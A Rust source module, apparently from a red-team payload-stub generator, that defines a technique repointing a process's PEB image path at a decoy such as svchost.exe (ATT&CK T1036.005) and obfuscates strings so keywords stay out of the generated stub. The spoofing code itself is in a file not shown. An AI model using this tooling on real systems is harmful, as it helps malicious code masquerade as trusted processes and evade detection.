//! Image path spoofing.
//!
//! Repoints the process's `PEB->ProcessParameters->ImagePathName` at a decoy
//! path, so the PEB readers report the decoy instead of the real artifact.
//! Measured on Windows 11 26200: `GetModuleFileNameW(NULL)` resolves the main
//! module through the loader list and is **not** fooled by this field; what the
//! technique changes is what a PEB parser reads. A Preparation technique: it
//! modifies the process state and never runs the payload. See `README.md` for
//! the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for image-path spoofing.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// The decoy image path the PEB will report — usually a signed system binary
    /// (`C:\Windows\System32\svchost.exe`). Rebuilt at runtime from `strings`.
    pub path: String,
}

impl Default for Params {
    /// Defaults to an empty path.
    ///
    /// The manual impl keeps `Params::default()` and the serde field defaults in
    /// step; `path` has no serde default, so a plan must name it.
    fn default() -> Self {
        Self {
            path: String::new(),
        }
    }
}

/// Static metadata for image-path spoofing.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "image_path_spoofing",
    // T1036.005: match a legitimate name/location — the process masquerades as a
    // signed system binary to the PEB readers.
    attck: &["T1036.005"],
    // Measured on Windows 11 26200 (2026-10-14): the PEB `ImagePathName` really
    // is repointed (a payload reads the decoy), but `GetModuleFileNameW(NULL)`
    // is **not** fooled — it resolves the main module through the loader list.
    // The state stays `Experimental` because the effect is narrower than the
    // name suggests: PEB parsers only.
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    // `self_deletion` resolves the running image's own path (`GetModuleFileNameW`),
    // which this technique repoints — it would act on the decoy.
    conflicts: &["self_deletion"],
    category: Category::Preparation,
    doc_path: "src/techniques/image_path_spoofing/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: r#"technique: image_path_spoofing
params:
  path: "C:\\Windows\\System32\\svchost.exe""#,
    // The spoof is a plain memory store into the process's own read-write
    // PEB/process-parameters block; no `Nt*` call is involved, so the syscall
    // layer has nothing to route.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — and no technique keyword like
/// `loader` — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_PEB_FAILED$", "could not read the PEB"),
    (
        "$MSG_PARAMS_FAILED$",
        "the process parameters are not initialized",
    ),
];

impl Params {
    /// Renders the image-path-spoofing stub fragment, obfuscating the decoy path
    /// and every diagnostic through `strings`.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let path_def = strings.obfuscate(&self.path).render_stub_expr("spoof_path");
        let mut rendered = DEF.stub_fragment.replace("$SPOOF_PATH_DEF$", &path_def);
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("imgpath_msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
